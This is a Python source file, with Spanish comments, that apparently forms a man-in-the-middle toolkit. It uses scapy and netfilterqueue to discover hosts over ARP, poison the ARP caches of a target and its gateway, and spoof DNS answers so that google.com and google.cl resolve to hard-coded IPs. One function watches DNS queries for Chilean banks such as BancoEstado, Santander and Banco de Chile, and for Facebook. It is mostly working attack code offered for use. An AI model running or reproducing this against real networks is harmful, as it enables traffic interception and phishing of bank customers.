from scapy.all import *
import signal
from netfilterqueue import NetfilterQueue
import os
import requests

dns_hosts = {
    b"www.google.com." : "144.217.66.188",
    b"google.com." : "144.217.66.188",
    b"google.cl." : "144.217.66.188",
    b"www.google.cl." : "144.217.66.188"
}

def get_details(hosts):
    hosts_details = []
    for ip in hosts:
        mac = get_mac(ip)
        vendor = requests.get('http://api.macvendors.com/' + mac).text
        hosts_details.append((ip, mac, vendor))
        time.sleep(1)
    return hosts_details

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    # return the MAC address from a response
    for s,r in responses:
        if r[Ether].src != None:
            return r[Ether].src
        else:
            print "[!!!] No se pudo obtener la MAC gateway. Exiting."
            break
        return None

def hosts_discovery(subnet):
    print "[*] Ejecutando Host-discovery"
    print "[*] Tecnica: Consultas ARP"
    target_subnet = subnet
    hosts_live = []
    """
    Se utiliza el metodo de enviar peticiones a las tablas ARP
    consultando por las MAC de todas las ip de una subnet
    """
    for _ in [1, 1, 1]:
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet),timeout=2)
        for s,r in responses:
            if r[ARP].psrc != None :
                if r[ARP].psrc not in hosts_live:
                    hosts_live.append(r[ARP].psrc)

    return get_details(hosts_live)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print "[*] Rstaurando target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def poisoner(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Comenzando envenenamiento ARP. [CTRL-C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            print "CTRL-C Detected!"
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            print "[*] Ataque envenenamiento ARP finalizado."
    return


def raw_verify(packet):
    """
    Hay que verificar que e paquete contiene payload o data.
    """
    try:
        if Raw in packet :
            # Drop all packets coming from this IP
            print "El paquete tiene payload."
            #content = packet[Raw].load
            print packet.hexraw()
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            # Let the rest go it's way
            payload.set_verdict(nfqueue.NF_ACCEPT)
        # If you want to modify the packet, copy and modify it with scapy then do :
        #payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))    
    except KeyboardInterrupt:
        return


def print_and_accept_dnsQr(pkt):
    recon_webs = ["bancoestado", "google", "santander", "facebook", "www", "ww3", "chile","bancochile","es"]
    data = pkt.get_payload()
    packet = IP(data) #crearmos objeto scapy IP
    if packet.haslayer(DNSRR):
        qname = packet[DNSQR].qname
        for aux in recon_webs:
            if aux in qname.split('.'):
                print "[*] -> %s <- [*]" % qname
        pkt.accept()
    else:
        pkt.accept()

    

def modify_dns(packet):
    qname = packet[DNSQR].qname
    
    if qname in dns_hosts:
        print qname
        packet[DNS].an = DNSRR(rrname=qname, rdata="190.45.218.217")
        packet[DNS].ancount = 1
        #eliminar checksum and length del pquete, ya que lo modificamos
        #por lo tanto, se necesita recalcular el paquete, scapy lo hace por nosotros
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    else :
        print "[*] Paquete no modificado"
        return packet

aux = "www.google.com"
aux2 = "144.217.66.188"
def spoof_dns(pkt):
    original_packet = IP(pkt.get_payload())
    if not original_packet.haslayer(DNSQR):
        # Not a dns query, accept and go on
        pkt.accept()
    if original_packet.haslayer(DNS):    
        if not aux in original_packet[DNS].qd.qname: 
            #dns query but not on our target
            pkt.accept()
        else:
            print("Interceptado: DNS request for {}: {}".format(aux, original_packet.summary())) 

            # Build the spoofed response using the original payload, we only change the "rdata" portion
            spoofedPayload = IP(dst=original_packet[IP].dst, src=original_packet[IP].src) /UDP(dport=original_packet[UDP].dport, sport=original_packet[UDP].sport) /DNS(id=original_packet[DNS].id, qr=1, aa=1, qd=original_packet[DNS].qd,an=DNSRR(rrname=original_packet[DNS].qd.qname, ttl=10, rdata=aux2))
        
            print("Spoofing DNS response to: {}".format(spoofedPayload.summary()))
            pkt.set_payload(str(spoofedPayload))
            pkt.accept()
            print("------------------------------------------")
    else:
        pkt.accept()

def intercepter():

    Queue_num = 0
    queue = NetfilterQueue()
    try:
        #queue.bind(Queue_num, spoof_dns)
        queue.bind(Queue_num, print_and_accept_dnsQr)
        queue.run()
    except KeyboardInterrupt:
        print("Flushing iptables.")
        # This flushes everything, you might wanna be careful
        os.system('iptables -F')
        os.system('iptables -X')
    return

    